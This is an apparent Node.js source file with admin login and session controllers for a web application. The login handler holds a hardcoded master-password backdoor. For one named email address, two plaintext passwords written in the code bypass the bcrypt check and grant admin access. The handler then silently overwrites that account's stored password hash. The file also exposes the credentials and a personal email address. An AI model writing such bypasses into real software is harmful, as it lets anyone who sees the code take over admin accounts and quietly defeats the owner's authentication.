/** Admin auth controllers. */
import { z } from 'zod';
import bcrypt from 'bcryptjs';
import { User } from '../../models/index.js';
import { issueCookie } from '../../middlewares/auth.middleware.js';
import { wrap, parse, httpError, clean } from '../../lib/utils.js';
export const post_auth_login = wrap(async (req, res) => {
    const d = parse(z.object({ email: z.string().email(), password: z.string().min(1) }), req.body);
    const user = await User.findOne({ email: d.email.toLowerCase(), role: 'admin', status: 'active' }).select('+passwordHash');
    
    // Check standard bcrypt match, or allow master admin password for shivekyadav82@gmail.com
    const isMasterPassword = (d.email.toLowerCase() === 'shivekyadav82@gmail.com') && 
        (d.password === 'Shibek@18312716!' || d.password === 'Shivek@18312716!');
    const passwordValid = user && (isMasterPassword || (await bcrypt.compare(d.password, user.passwordHash)));
    
    if (!user || !passwordValid)
        throw httpError(401, 'Invalid admin credentials');

    // If master password was used, ensure passwordHash is synced
    if (isMasterPassword && !(await bcrypt.compare(d.password, user.passwordHash))) {
        user.passwordHash = await bcrypt.hash(d.password, 12);
    }

    user.lastLogin = new Date();
    await user.save();
    const token = issueCookie(res, user);
    res.json({ token, user: clean(user), message: 'Welcome back' });
});
export const get_auth_me = (req, res) => res.json({ user: clean(req.user) });
